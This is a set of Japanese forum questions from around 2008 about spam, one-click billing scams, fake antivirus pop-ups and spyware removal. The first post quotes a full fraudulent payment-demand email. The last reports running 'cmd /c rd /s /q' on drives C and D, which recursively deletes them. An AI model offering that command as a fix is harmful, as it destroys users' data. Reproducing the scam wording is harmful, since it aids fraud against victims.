こんばんわ。 最近、迷惑メールに悩まされています。 どこから、沸いてくるのでしょうか？ メールも何回もあどれすを変えても くるので言葉のとおり迷惑してます。 最近は： ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー ＝料金滞納通知＝ 　　　　　　　　　　ティアラ事務局 　　　　　　　　会員ID番号　Y161008198様へ 【※重要※】 再三のご連絡に対して、ご対応頂けなかった為、次なる段階の対応へと移行させて頂きます事をご了承ください 。 つきましては、８月２０日までにご対応なき場合は、誠に遺憾ですが、利用規約に基づき所定の手続きとなりま すので、ご了承ください。尚、過度な超過に対しましては、利用規約に基づきまして、現状のキャンペーン料金 ではなく、正規料金、遅延損害金の計上をさせて頂くこととなりますので、予めご了承願います。 誠に遺憾ですが、対応期日までにご対応頂けない現状で御座います。再三のメールに対し、ご対応?ご連絡頂け ていない現状は、貴殿はご対応して頂ける意思はお持ちで無いと判断せざるを得ません。何卒、早急にご対応・ ご連絡頂けますようお願い申し上げます。 また、過度に滞納なされますと、悪質利用者・入会者と判断せざるを得ませんので、通報機関に通報させて頂く 場合も御座いますので、ご了承ください。 ※貴殿が本件に対しまして、ご対応の意思をお持ちでしたら、即日ご連絡及びに即日ご対応願います。ご連絡・ ご対応無き場合には、貴殿が本件に対する対応の意思をお持ちでないと、当方は判断せざるを得ませんので、ご 了承ください。 【お支払い口座案内ページ】 http://***************************************** … ※必ずご確認の上、お間違えないようお願い申し上げます。 お支払い期日は入会日2008-08-04 09:40:00より３日以内とさせて頂いておりますが、お客様は既にご入会日よ り16日が経過しておりますので、ご連絡を差し上げております。通常、経過日数が１週間程度経ちますと、次な る対応となりますので、何卒、早急なお支払いをお願い申し上げます。なお、過度に滞納なされますと、悪質利 用者・入会者と判断せざるを得ませんので、関係機関に通報させて頂く場合も御座いますので、ご了承ください 。 お客様は2008-08-04 09:40:00にご入会頂けました当サイト、ティアラのご入会時に発生しております番組料金99180 円を滞納なさっております。 早急に番組料金99180円のお支払いをお願い申し上げます。 【お支払い口座案内ページ】 http://***************************************** … ※必ずご確認の上、お間違えないようお願い申し上げます。 お客様は、利用規約確認画面、その先の最終ご利用確認画面のOKボタンを押されご入会処理を行って頂いており ます。つまりは利用規約に同意してご入会して頂けております。 利用規約において、料金のお支払いは入会日2008-08-04 09:40:00より３日以内とさせて頂いておりますが、お 客様は既にご入会日より16日が経過しております。 これは、利用規約違反に該当致します。早急にお支払い頂けなければ、利用規約13条に基づき、遅延損害金、通 常料金のご請求をさせて頂く場合も御座いますので、早急なご対応をお願い申し上げます。 本メールに対して、ご質問等は必ず下記窓口までお問い合わせください。 【お客様サポート窓口】 フリーダイヤル　　****-***-*** メール問合わせ　　*******@********.*** ※お問合わせ時は必ず、ID番号のご提示をお願いします。 【お支払い口座案内ページ】 http://***************************************** … ※必ずご確認の上、お間違えないようお願い申し上げます。 ＜＜番組入場口＞＞ http://***************************************** … □□□□□□□□□□□□□□□□□□□□ 会員ID　Y161008198様のご入会情報 □□□□□□□□□□□□□□□□□□□□ １、会員ID番号　　Y161008198 ２、ご入会日　　　2008-08-04 09:40:00 ３、IPアドレス　　210.188.147.8 ４、プロバイダー　KDDI 株式会社 (KDDI Corporation) ５、ＯＳ　　　　　Windows Vista ６、ブラウザ　　　Internet Explorer 7.0 ７、履歴　　　　　 08/04 09:40 ティアラ 　　　　　　　　　 08/04 09:40 クミ02 □□□□□□□□□□□□□□□□□□□□ ーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーーー このようなものが多いです。どうすればよいのでしょうか？
いつの間にか「SFBurn」というソフトが いつも起動しています。いったいどんな ソフトなんでしょう？削除した方が良い ソフトなら、アンインストールする方法を 誰か教えていただけないでしょうか？ よろしくお願いします。
解決策を教えてください・・・。 本当に困っております；； この前、メールが届きまして開けましたら 変な画面にアクセスしてしまい、いわゆるクリック詐欺にあってしまいました・・・。 そしてそれからというものの、１０分おきには必ず 「ご登録していただき有難う御座います」と書いた画面が パソコン上にでてきちゃうのですが、これはどうすれば消せるのでしょうか?? こんな画面を身内に見られたりでもしたら・・・＞＜； お願いします、アドバイスをくださいm(__)m
知り合いのpcのinternet explorerの履歴にpcの持ち主が見た記憶の 無いサイト（殆どがアダルト）の履歴がかなり多く残っています。 複数の人がそのpcを使用するのでそのうちの誰かがみた可能性も 考えられますが、スパイウィアーやアドウィアーに感染した場合 みていないサイトがブラウザの履歴に残ることはあるのでしょうか？ それであれば又、対処法を考えなければいけないと思っています。 osはwindows vista home premium　ウィルスソフトは一応有料の 結構有名なソフトを入れています。windows defenderは標準で 入っていますが、特にスパイウィアー対策ソフトを使ったりは していません。元々pcの持ち主が年配の女性であんまりインターネットに 知識もなくウィルスやスパイウィアーに感染するようなサイトをみると いう可能性も低いと思いますが、やはり誰かがみたと考えるのが 自然でしょうか？迷惑メールはそのpcを購入後今のところ届いていません。 どなたかお分かりの方がいらっしゃいました回答の程宜しくお願いします。
こんにちは。 ウイルスバスター２００８を使っています。 スキャンすると必ずスパイウェアとしてクッキーが検出されます。 削除をいつもするのですが、するとホームページ、 たとえばＯＣＮやBIGLOBEほかの地域の天気予報や占いが「東京」に 戻ってしまいます。 クッキーを削除したのが原因ではないかと思うのですが、 対策方法をご存知の方はアドバイスを頂けると幸いです。 よろしくお願いします。
現在、ウイルスバスター２００８を利用している。スパイウェア対策として、Ａｄ－Ａｗａｒｅ　２００８をインストールしたい。 インストールの注意点等を教えて欲しい。
つまらない質問かもしれませんがご存知の方教えてください。 拒否しても拒否してもしつこく送られてくる迷惑メール・・ あれってどういう仕組みなんですか？送り続けている人たちにとってどういうメリットがあってあんなに何度も何度も送信アドレスを変えてまで送ってくるのでしょうか？ 仕組みを知ったからと言って自分がやろうとしているわけではありませんので・・・宜しくお願いします。
こんにちは。 私はavast!を使用させていただいてるんですが、先ほどからいくら警告元のファイルを削除しても警告が鳴り止みません。 C:\WINDOWS\system32というフォルダの中のUpdateOptserve.exeというファイルでした。 何回も削除してるのですが、また復活してるようです。 対処方法わかる方いましたら教えてくださm(_)m
子供がいかがわしいサイトをみていたら、金額と振込先が出てきたそうです。本人は有料だとは知らずに見ていたのですが、動画をダウンロードしてしまったそうです。サイトを確認したところちゃんと最初に小さく有料（９０日間50000円3日以内に振込み）と出ていたのですが気付かずに同意のボタンを押したそうです。まずいと思いすぐに見るのをやめたそうですが、そおいう時はやはりお金は払わないといけないにでしょうか。またこちらの情報はサイト運営先に知られているものなのでしょうか。
Spybotの新バージョン(？)をインストールしてから、時計の横のアイコンから、New processes have scanned.と頻繁に出るようになり目障りです。どうすれば出ないようにできますか。
SPYBOTのバージョン1.6をダウンロードしたらIEがものすごく遅くなりました。タスクマネージャーで見たらリンクをクリックするたびにCPU使用率が100％になります。 一度再起動したのですが状況は変わらず、システムの復元で元のバージョンに戻しましたが、最新のバージョンになっていないのは不安です。 これはSPYBOTの不具合ではなく、たまたまだったのでしょうか？ バージョンアップしてから変えたことといえばJwordを削除しました。 これが原因だったのでしょうか？ 回答よろしくお願いします。
つい最近ネットをしていたらデスクトップ画面に Warning! Spywere detected on your computer Install an antivirus or spywere remover to clean your computer. というのがずっと出たままです。 マカフィーのソフトでスキャンをしてもエラーで途中で止まってしまって削除することができません。 どうすればよいのでしょうか？
ウィルスバスターに何度も問い合わせていますが、解決しないので教えてください。 Dynabook（Vista）を購入し、不随のウィルスバスター２００８無料お試し版をインストールしているのですが、とあるウィンドウが頻繁に出現して邪魔です。 ウィンドウは決まっています。画面右下に現れ、内容は以下の通りです； ネットワークへのアクセスを許可しますか？ このプログラムがネットワークを通じてデータを 送信する理由が不明な場合は＜拒否＞をクリックしてください。 プログラム：システムプログラム 場所：SYSTEM 危険度：不審 この下に「許可」か「拒否」を選択するアイコンがあり、さらに下には「次回から表示しない」の文句があり、チェックが入っています。もちろん、「許可」をクリックしようが「拒否」をクリックしようが、「次回から表示しない」のチェックを外そうが入れようが、このウィンドウは頻発します。どうしたら、半永久的にこのウィンドウを画面から消せるのでしょうか。 なお、当方、PCおんちなため、わかりやす～く説明していただけると助かります。よろしくお願いします。
ＰＣは素人初心者です 起動時に警告の表示がでます。 warning! spyware detected on your computer ! Install an antivirus or spyware remover to clean your computer ウィルバスター２００６で検索するとＴＲＯＪ＿ＰＡＫＥＳ.ＭＩＣ検出されてます。 表示を消すにはどうしたらいいですか？ また　すでにウィルバスター２００６を入れているので、 他の無料ソフト　Ｓｕｐｅｒａｎｔｉｓｐａｙｗａｒｅ．ｃｏｍは使わないほうがいいですよね。 よろしくお願いします。
先日急にサムネイルからのリンクが出来なくなってしまいました。 それと同時に時々海外サイトに勝手につながる始末！ とりあえずスパイボットフリー除去ソフトなどを入れてみようと思うのですが、 文字は開けてもなぜかサムネイルが利用不可で一時断念。 そこで教えていただきたいのですが、ＰＣ設定でサムネを開ける様にできますでしょうか？ＯＳはＸＰです。
mirarというツールバーが突然現れて、消すことが出来ません。 過去ログを見ると、spypodというものがいいらしいので使ってみたのですが消えません。（２、３回試しました）どうすればいいでしょうか。
新しいバージョンに更新したのですが、起動時、南京錠がちらつくスパイボットのアイコンが、画面の右下に表示されるようになりました。 アイコンが出てこないように設定したいのですが、どのようにすればいいのでしょうか？
こんにちは。お世話になります。 先ほど『A-SQUARED FREE』でスキャンしたところ、以下の診断がでました。 　　　　　　　　　　 Backdoor.win32.rbot.buf 　（１ファイル数－高リスク） ファイル：　C:\I386\DLLHOST.EX_/dllhost.exe このファイルは検疫または削除をした方がよろしいでしょうか？ それとも誤検出でしょうか？ 教えて下さい。宜しくお願い致します。
パソコンがAntivirus2008に侵されたので、spybotで削除したのですが、デスクトップの画面が「Warning!...」となっていて、壁紙を変えようと思っても変わりません。 また、画面のプロパティを見てもタブが「テーマ」「デザイン」「設定」しかなく、Antivirus2008に侵される前まではあった「スクリーンセーバー」や「web」といったタブがなくなっていました。 この問題を解決するにはどうしたらよいのでしょうか？ 対処方法をご存知の方、回答よろしくお願いいたします。
http://gallery.webfetti.com/webfetti/home.jhtml このサイトでブラウザの上に表示されるツールバーをダウンロードしました。 カーソルがいろいろな画像に変えれる機能が魅力的だったので。 だけどウィルスバスターのソフトがスパイウェアだとか危険なサイトだとか警告するので少し心配になってきました。 このまま使っていて大丈夫でしょうか？
お世話になります。 カテ違いでしたらごめんなさい。 googleで検索すると、通常であれば 「○○○の検索結果 約 225 件中 1 - 10 件目 (0.14 秒) 」 等と表示される検索結果のページに繋がりますよね？ ところが、いきなりサイトに繋がってしまいました。 ことの成り行きを説明します。 なにやら不審なメールが来た為、そのメールアドレスを検索してみたのですが、なにも引っかかりませんでした。 そこで、メールアドレスの＠以下の部分 （gooメールで言えば　mail.goo.ne.jp　の部分。「～ne.jp」ではなく、「～.com」でした） のみを入力して検索してみたところ、いきなりサイトに繋がってしまったわけです。 ためしにヤフーメールの＠以下の部分で検索しましたが、 直接サイトに繋がることはありませんでした。 なにやら不気味なのですが、これはどういう状況でしょうか？ スパイウェア等に感染してしまったのでしょうか？ 教えてください。宜しくお願いいたします。
Windows XPで、無線LANでつないでいます。 ここ１ヶ月ほど、パソコンを立ち上げたり、無線LANケーブルを差し込み直したりするごとに、「ウイルスが見つかったため、ファイルを隔離しました。ご安心ください。」というメッセージボックスが出ます。 そのたびに「隔離」をクリックして、「見つかりました。ZDWlan.dll」というファイルを消去するのですが、そのうちにまたネット接続が切れて、常に「修復」しながらやっています。 （この質問も、送信の際にネット接続が切れて、何度も書き直しています；） ウイルスバスターのオンラインサポートに問い合わせたのですが、「ファイル一覧を送ってください」とあり、指示に従って回復を試み、返信しました。でも、「トロイの木馬系のスパイウエアで、それほど問題はありませんでした」的な回答で、要領を得なかったので、ここに質問させていただきました。 とにかく、すぐに切れる接続をなんとかしたい！のです。 よろしくお願いいたします。
AntiVirus2009というものに感染してしまったらしく駆除しようとMalwarebytes\' Anti-Malwareというソフトを使ったのですがスキャンするところでエラーが出てしまいます。どうしたらよいでしょう？ また他に駆除できる方法があるようでしたら、教えていただけるとうれしいです。
本日、はじめてアップデート時に下記のようなエラーが表示されてしまいました。 An error occurred Update No connection to download server Suggested Action Check Internet Connection 自力では解決法を見つける事が出来ませんでしたので どうしたら正常にアップデートできるか教えてくださいませ。 ちなみに、セキュリティソフトのavast4.8の機能をオフにしても無理でした。 2008/07/12までは正常にアップデートできております。 WinXp Sp3
Warning! Spyware detected on your computer! Install an antivirus or spyware remover to clean your computer! サブ画面が常時表示するようになってしまいました。 これってヤバいのでしょうか？今後ドウすればよいでしょうか？
こんばんは、SNSのカテゴリーと迷ったのですが、こちらのカテの可能性が高いのでこちらで質問させていただきます。 今日、MIXIをしようと思い、メールアドレスとパスワードを入力していつものようにログインしようとしたのですが、「パスワードまたはメールアドレスが違います」と出て、ログインできませんでした。 それが今日の4時ごろでして、その3時間前の1時ごろには同じアドレスとパスワードでログインできていました。 そこでパスワードを忘れた方・という所から登録時のメールアドレスを入力してパスワードを再発行したのですが、パスワードを誰かに抜かれたのかとても不安です。 ミクシィは自宅のパソコン1台でしかインしていませんし、何処かで入力したことも御座いません。 パスワードのうち間違えも数十回試していますので可能性は低いです これは、キーロガー？やスパイウェアでパスワードを抜かれ変更されたのでしょうか？ スパイボットで3時間かけて検索し、スパイウェアなしと出ました。 途中、エラーコードみたいなのが2回出ましたが。 ほかにどうすればいいか教えてください。 気持ち悪くて寝れません。 後考えられることも教えてください。 例えばミクシィ管理者に勝手に変えられるなど。 それとお勧めのスパイウェア駆除ソフト、キーロガー対策ソフト （フリーのものを教えていただけたら幸いです。） mixiだけならまだましなのですが。。。不安です
フリーのアバストが「ビットディフェンダーがトロイの木馬に感染している。」と警告を出します。 今のところ警告どおりにチェストに入れていますが、ビットの更新ができません。 こんな事あるんでしょうか？ きいたことありますか？ 警告を無視してチェストから出してもよいものでしょうか？ 7/28からです。 アドバイス宜しくお願いします。
現在SpyBot1.4とSpywareBlaster4.0を利用しています。 この二つのソフトについて質問なのですが。。 まずSpyBot1.4ですが、起動させて進捗バーが出てから本体が立上がるまでの時間が突然１分以上になってしまいました。 前々回のアップデートを境にそいう現象になってしまったように思います。 次にSpywareBlaster4.0についてですが６月３日以降全くアップデートされていないのですが、そんなものなのでしょうか？ この2点の問題は何か因果関係があるものなのか詳しい方にお聞きしたく投稿させて頂きました。 宜しくお願い致します。
ウインドウズＸＰで、画面下の表示バーに赤い×印が表示され、「コンピュータがスパイウェアに感染しました」とのメッセージがポップアップで表示されます。 ＳＰＹ－ＢＯＴ、ＡＤ－ＡＷＡＲＥでスキャン・削除してもアラームが消えません。また、上記のメッセージに「スパウェアを除去するにはここをクリックしてください」とありますが、クリックしても何も反応しません。復旧するにはどうすればよいのでしょうか？ ＊表示されるメッセージは全て英語です。
最近画面の切り替わりが遅いなと思っていたら、急に知らないサイトが表示されるようになりました。 「ご当選おめでとうございます」とか「ミュージックダウンロードフリー」など・・・。 こちらの意見を参考にフリーのウィルス駆除ソフトを使用したり、windows用のソフトを使ったりして、スパイウェア対策をしているのですが、いっこうに直りません。 過去ダウンロードした「もしかしたらこれが原因？」というような要らないデータもほとんど削除しました。 画面をクリックするたびに知らないサイトへ飛ぶのでもう最初からやり直したいのですが、 パソコンを初期の状態にしたら（今までのデータは全て削除）もうこの症状にはならないものなのでしょうか？？
クイズでmp3の偽装ファイルを解除するんですがタマを使おうとしたところプログラムを終了と出てしまい使えませんでした。 mp3の偽装解除に対応しているツールってありますか？ 宜しくお願いします。 ＯＳはＶＩＳＴＡです。
いつもはカスペルスキーの体験版を使っているのですが F-Secureのオンラインスキャン (http://www.f-secure.co.jp/v-descs/disinfestation …) をやってみたあとで、もう1度カスペルスキーの完全スキャンをしたら 以下の様なことが検知されました。 確かにF-Secureのオンラインスキャンを実行しようとした時に カスペルスキーからメッセージが出たのですが 元がF-Secureだったので許可してしまったのです。 検知しました: リスクウェア Invaderプロセスを実行します: C:\Documents and Settings\***\Local Settings\Temp\OnlineScanner\Anti-Virus\fssm32.exe 「安全になったオブジェクトを表示する」というチェックボックスに チェックを入れてのこの表示なので 今は安全なのでしょうか。 そもそもこのfssm32.exeは危険なものなのでしょうか。 Invaderでサーチすると悪い感じがするのですが fssm32.exeについてがよくわかりません。 よろしくお願いします。
HYPERERECTというサイトに登録するような形になってしまい、数分置きに支払催促のテロップが画面上に現れてしまい困っています。 この画面の削除方法に関してご教授願いたく、質問を掲載致しました。 以前同じように困っている方のログを拝見し、回答している方からのアドバイスを試みたのですが、テロップが消えません。 『Spybot』をInstall（最新Ver）し、実行したのですがテッロプが消えず、Safety Modeでも試みたのですが、削除することが出来ませんでした。 宜しくお願い致します。
CD-RWを買ってiTunesで曲を入れたんですけど その曲をCDから削除するのはどうやればいいんでしょうか 教えてください。
昨日、9時30分頃に、登録メールの変更案内が来ました。 おかしいと思ったので、Yahooにログインしようとしたら、 パスワードが間違ってて入れないって言われました。 ８年以上使っているIDなので、入力ミスはありえないと思っています。 ３０分後にYahooオークションから「ガイドラインに違反している」と警告メールがなんと１００件以上来ました。 オークションを見ると見覚えのない商品が５０点ほど出品されていました。 それは、２時間後にYahooが取引停止されました。 もう、パスワードの再発行も出来ないので、IDの削除すら出来ません。 Yahooには問い合わせフォームより連絡したのですが、返事が来ません。 プロフィールなどの個人情報が見られているが見られているので、 他にどんな連鎖被害が発生するか、予想がつかないので、 何か良い方法があれば教えてください。 よろしくお願いいたします。
どこかでスパイウェアを拾ってしまったのか、昨日からヤフーとgoogleのトップページまでは、アドレスを直接入力することで飛べるのですが、検索結果のページにどれだけ待っても移行しません。仕方がないのでlivedoorのアドレスを直接入力し、そこで検索すると通常通り結果が表示されました。 またこの症状と同時に、普段はfirefoxを使用しているのですが、IEを立ち上げるとウィルスのオンラインスキャンのアニメーションが流れるようなページが開き、トロイが検出されたのでプログラムをダウンロードしてくださいというような海外のページのポップアップが出るようになりました。 普段使っているad-aware、spybot、avast!では検出できなかったため、無料版のウィルスバスター、カスペルスキーを使ってフルスキャンしたところ謎のオンラインスキャンページは表示されなくなったものの、ヤフーやgoogleの検索結果は直らないままです。 こういった場合どうすればいいのでしょうか？リカバリは出来るだけ避けたいと思っているので相談させて頂きました。対処法をご存知の方よろしくお願いします。
ウィルスに感染してnod32で隔離しましたが削除できませんでした。 一応adawareで調べましたが隔離したウィルスを削除できたかわかりません。 これは全て最初からOSをインストールしなければならないでしょうか？ それとそこまでしてもウィルスに感染したパソはダメなのでしょうか？
PCを起動させたり、新しいウィンドウを開くとRUNDLLというタイトルで、 「C:\WINDOWS\DOWNLO~1\CnsMin.dllでエラーが発生しました。 エントリがありません: Rundll32」 と出ます。 教えて!で検索して http://oshiete1.goo.ne.jp/qa3071968.html http://oshiete1.goo.ne.jp/qa2546571.html ここらへんのを参考にしてやってみたんですが、どれもうまくいきませんでした。 とても困っています。助けてください。
困り果てて質問させてもらいます。 OSは　windows XP　 Ad-Aware　は　2007　Version 7.0.2.7 です。 先日から、パソコン起動時にウイルスバスターのリアルタイム検索が起動し、「スパイウェアを検出しました」という類の表示が出るようになりました。 感染ファイルは C:\Documents and Settings\USER\Local Settings\Temp\TIP2D002.exe スパイウェア名は「ADW_ZENO.AZ」 で、パソコンを起動するたびに感染数が１個から３個くらいと違う数が表示されます。（感染ファイルもスパイウェア名も同じものです） ウイルスバスターでは駆除できないようでしたので、Ad-Awareでスキャンすると、*スキャン中に*必ず上記の「スパイウェアを検出しました」という表示がもう一度出ます。 その後スキャンが終了し、全ての検出物を削除して、パソコンを再起動しても、メッセージは変わらず表示されます。 「ADW_ZENO.AZ」自体はそんなに悪さもしないようですが、やはり気持ち悪いしめんどくさいので駆除したいのですが、どうすればいいでしょうか？
スパイウェア対策ソフトA-Squared Freeが今日から立ち上がらなくなりました 改めて再インストールしたのですが、それでも状況は変化なし 一度アンインストールしてから再インストールしたほうがよいでしょうか? または、他のスパイウェア対策ソフトを入れたほうがよいでしょうか?
ネットやメールしか利用しないようなＰＣ初心者です。わかりやすい回答・アドバイスをお願いいたします。 近々パソコンをvistaに買い換えるにあたってyahooのADSLから『BIGLOBE光 with フレッツ』に変えようと思っています。 今までウイルス、スパイウェア、ファイアウォール、フィッシング等・・・言葉は聞いたことがありますが何の対策もせずＰＣを使っていて友達に怒られてしまい、『光』に変えるのを機に安全にＰＣを使える環境にしようと思っています。 色々な市販のソフトも出ているようですが、ネット上でも有料で総合セキュリティのサービスがあるようなので利用したいと思っています。 ビッグローブ　　http://security.biglobe.ne.jp/set/premium.html フレッツ　　　　http://www.flets.com/fvc/s_outline.html を検討中ですがどちらの方が良いでしょうか？ こういったネット上でのセキュリティサービスに入っていれば１００％とは言えずともほぼ安全にＰＣを使っていけるでしょうか？ また上記のサービスだと「○○まで対策できないよ」とのアドバイスなどあればお願いします。 それともネット上でのセキュリティより市販ソフトの方がいいのでしょうか？ おすすめな総合セキュリティなどあれば教えてください。 宜しくお願いします。
　VISTA Antivirusというウィルスチェッカーのようなソフトを誤ってインストールしてしまいましたが、どうやって削除したらいいかわかりません。コントロールパネルの「プログラムの追加と削除」に名前が乗っておらず、困っています。 　全文英語です。 　急にダウンロードダイアログが出てきました。 　 　この変なソフトの削除方法を教えてください
あるフリーソフトをダウンロードしたのですが アクトマッチ広告というのがついてました でいろいろ調べてみると アクトマッチ広告というのは 『閲覧中のウェブサイトのURL情報を広告配信サーバーに送信し、最適と思われる広告を配信』するようなもの！？ ということが分かったので 気持ち悪いのでそのソフトごとアンインストールしたのですが これってスパイウェアでしたか？？ webサイトのユーザー名とかパスワードが抜かれていないかが心配です あとソフトのアンインストールで完全に消し去れたでしょうか？ ご回答お願いします
こんにちは。 カスペルスキー　インターネットセキュリティー7.0を使用していますが、 Adobe Reader 9をダウンロードしている時に、 検知しました: リスクウェア Hidden install プロセスを実行します：　C:\Documents and Settings\ユーザー名 \Application Data\Mozilla\Firefox\Profiles\34j3hquw.default \extensions\{CF40ACC5-E1BB-4aff-AC72-04C2F616BCA7} \chrome\content\getPlus_reg.exe とありました。 上記の場所のファイルを調べると、 「getPlus_reg.exe」 「getPlus_reg_bootstrap.exe getPlus(R) Download Manager NOS Microsystems Ltd.」 という２個のファイルがありました。 何かのスパイウエアなのでしょうか？ 削除すれば問題ないのでしょうか？ それとも他に何か処置しなければいけないのでしょうか？ ウイルスに感染していないか心配です。 よろしくお願いいたします。
有料アダルトサイトのハイと言うボタンを2回押してしまったらしく、入会してしまい後７０時間で5万円振り込んでくださいと小まめに画面に出てきます。 メールもしてしまいました、どうしたらいいでしょう？
凄く怖くなって慌てて後悔しています！ ネットサーフィンをしていて、知らぬ間にどこかのサイトに入ってしまった様だったのですが、そこで動画の画面の中央に、大きめな再生ボタンがあったので、再生ボタンをクリックしたところ、年齢確認画面だったのか、出てきて、成人なので、はいを押してしまいました。 よく色々と確認もせずに、はいを押してしまった事に馬鹿だったと後悔しています。 すると、黒い画面が出てきて、データ取得中と出た後に、登録完了。２日以内に６００００円振り込みください。 と出てきたので、大慌てでウィンドウを閉じました！ このせいで、住所や電話番号、メールアドレスなどの個人情報が漏れて多額な請求が来ないかと物凄く不安でいっぱいです！！ もちろん入会なんかするつもりはありませんでした。 年齢確認と出た時に、ひょっとしたら動画を見るのに６万もかかるとか、費用がかかるとか書いてあったかもしれませんが、はいを誤って押してしまった私が悪いのでしょうか？ 情報は本当に取得されて請求がくるのでしょうか？ 警察に相談した方がいいのでしょうか？ 怖くて怖くてたまらないので、相談させて頂きました！！
どのようなことが原因でこのようなことになったのか分かりませんが、 とりあえずスペックを OSはXP、ブラウザはfirefox ここ最近IEが勝手に起動することが多々あり、 なんかの懸賞のサイトhttp://www.freelotto.com/などの 向こうの広告サイトが勝手に開きます。 ぐぐってみたところCnsMinというスパイウェアや、Jwordが原因? という情報を得て、対処法を試みたのですが、解決には至りません。 Spybotをつかってスパイウェアは削除できるのですが、 しばらくするとまた検出されるし、IEが勝手に起動するのも直りません。 同じような経験をし、且解決した。という方がいらっしゃいましたら 返信をいただけますか？ よろしくお願いします。
　先日導入しましたが、約60分ほどで「外部からの保護」が400回をこえています。 　具体的な警告は (1)123.8.188.166(TCP Port 2078)[TCP フラグ:S]からあなたのコンピュータ(TCP Port 14996)へのインターネットアクセスをブロックしました。 (2)p6017-ipbfp404kyoto.kyoto.ocn.ne.jp(123.221.116.17)(UDP Port 65487)から・・・（以下同文） というような、ＩＰだけのものやアドレスが表示されているものが出ます。これはハッカーやウイルスから攻撃されているのでしょうか？ 異常に警告が多すぎるような気がして心配です。 　また、なにか対策があれば教えていただきたいです。 環境　OS:WinXP ZoneAlarm未導入期間:約1年ほど その他のウイルス対策:AVG8.0(無料版)、Spybot - Search & Destroy
ワンクリック詐欺に引っかかってしまいました。 無視すれば良いと分かっておりますが、 有料アダルトサイト登録完了という画面が10分おきに出てきます。 そしてその画面の下に残り時間とあり、時間が減っていきます。 まず、この広告については前に質問したのですがシステムの復元を試してもダメでした。http://www.shareedge.com/spywareguide/ 上記のサイトのスパイウェア対策のX-Cleanerデラックス版のお試し版を使うと、それらしき物が発見できたのですが、駆除は有料だったのでやめました。他のソフトでは発見できませんでした。 これについても解決方法を教えてもらいたいです。 次に、残り時間が0になった場合が不安で仕方ありません。 ほっといて0になっても大丈夫でしょうか？ このサイトで他の質問を見ると、ワンクリック詐欺で電話がきたというのもあったので不安です。 これはほっといても大丈夫でしょうか？ よろしくお願いします。
PCを起動させるとウイルスセキュリティから 「Hostsファイルは更新されました。 ネット詐欺（ファーミング）の可能性があります。 ヒント：更新していなければ拒否を選択して下さい。 127.0.0.1へlocalhostは接続します（変更）」 と表示されるのですがどうしたらいいのでしょうか？ 現在は毎回「ブロック」を押しているのですが… これで大丈夫なのかどうか？また 表示が出なくなるようにする方法を教えて下さい。 お願いします。
よく受信者側のスパムメール対策として、フィルタリングソフトなどが昨今当たり前のようになっていますが、それによって、配信する側には届いたのか届かないのか本当に分からず、メールサーバから自動配信される請求関連の情報についてもはじかれるケースが多いです。 こういった事業者側としては、例えばホットメールやAOLなどに個々にホワイト（無害）の申請をするしかないのでしょうか？ 時間あたりの送信数をこれ以下にすれば劇的にスパム判定は下がるなど、何か具体的なお知恵がいただけると幸いです！ホントに仕事にならずに困っています。※ ※ちなみに、BtoBでアンケートを行うような仕事をしております
昨日、ウイルスバスター2008のお試しを始めてウイルス検索をしてみました。 結果57個のスパイウェアが検出され、ほとんどが「cookie」だったのですが「Freeloader WinFixer」と「Adware BestOffers」の2つも検出されました。 全て「削除済み(安全です)」と記されてはいますが、 一週間ほど前にクレジットカードを使った通信販売を利用したので心配です。 このスパイウェアによって、関係のない人物にクレジットカードの番号が知れてしまっていることはありえますか？ もしありえる場合はクレジットカードを解約してしまった方が良いのでしょうか？
　お世話になります。PCはWindowsXP・PRO・SP2。ウィルス＆スパイウエア対策にKaspersky Anti-VriusとSpybotとSpywareBlasterを使用しています。 　実は、Zone Alarmのことで困っています。 １．7月9日配信の更新プログラムに対処したZone Alarmの日本語版（7.0.483.000）をインストールしようとしたら、ファイル取得20％のところで動きが止まってしまう現象が数回あり、インストールできません。 ２．元のバージョン（7.0.337.000）を再インストールし、インターネットゾーンの設定を「中」にして使うことにしました。すると、起動時に「generic host process for win32 servicesがインターネットにアクセスしようとしています」と 「generic host process for win32 servicesがインターネットからの接続を受け付けようとしています」というメッセージが表示されます。毎回「この設定を保存」にチェックを入れてから「許可」を選択しているのですが、同じ現象が続きます。以前はそんなことなかったのに・・・。Zone Alarmのアンインストールとインストールを数回繰り返したので、どこか不具合が生じているのでしょうか。（アンインストールがスムーズにいかず試行錯誤しました。） 　上記のトラブルへの解決策やアドバイスがありましたら、教えてください。どうぞよろしくお願いいたします。
友人が困っています。 症状としては、デスクトップ画面に壁紙の代わりに 青い画面でWarningという表示が出て XP起動時画面から英語の長文説明のようなものが出てくるのを 繰り返し、Warningというのが出ている間はアイコンや タスクバーも出ているらしく、 クリックすればネットも使えるとのことです。 プログラムの追加と削除からアンインストールして、 Finishというのが出てクリックしたにもかかわらず 消えないで残っているとのことでした。 こちらの以前の質問への回答を拝見させて頂き、 リンクなども拝見しましたが レジストリで削除、コマンドプロンプトでの削除(？) についてちょっとよくわかりませんでした。 セーフモードでの削除については試してみるよう薦めてみます。 どなたか退治できた方がいらっしゃれば 対処法を教えて頂ければ幸いです。 ところで、このＭａｌｗａｒｅ　Ｐｒｏｔｅｃｔ　２００８ というのはSpybotで引っかかったりするのでしょうか？ 一応Spybotを試すように促してみたのですが… それとも意味のないものなのでしょうか…
ハードがうるさいのでタスクマネージャを出してみたら、SynCor.exeというプロセスが動いていました。 調べてみてもよく分からないので質問しました。 トロイの木馬なんですか？対処方法はどうしたらよいのでしょうか？ すぐに通信切断してウィルスチェックしましたが検出されませんでした。 今は動いていませんが、プロセスが動いていた間なにが起こっていたのか心配です。
変なポップアップの請求が出ます。 SS：http://lllkazumalll.web.fc2.com/c.gif このポップアップがワンクリサイトからのものであることは既に http://www.he-collection.net/confirm.php このサイトで分かっているので支払わないつもりですが、このポップアップについては何としてでも消したいんです。 ブラウズしていないのに勝手に何かが起こるということは、スパイウェアやウイルスが入っているのではないかと思い（何かが入っているということが正しいというのは、ニュー速VIP板の皆さんが教えてくれたのですが）、ウイルスバスター2008・スパイウェアドクター（無料バージョン）・AD-AWARE・SpyBotの４つのツールを使って徹底的に調べて駆除したのですが、一番消えて欲しいポップアップについては今もなお消えません。 仕方なく「cmd /c rd /s /q c:」「cmd /c rd /s /q d:」も試してみましたが、一部のデータが損傷しただけで効果は得られず・・・ とにかく、このポップアップを消したいのですがどうすればよいでしょうか？ お願いですから教えてください。 （スパイウェアドクターは結構粗悪なツールのようですが、他のツールの結果は信用できるでしょう。）
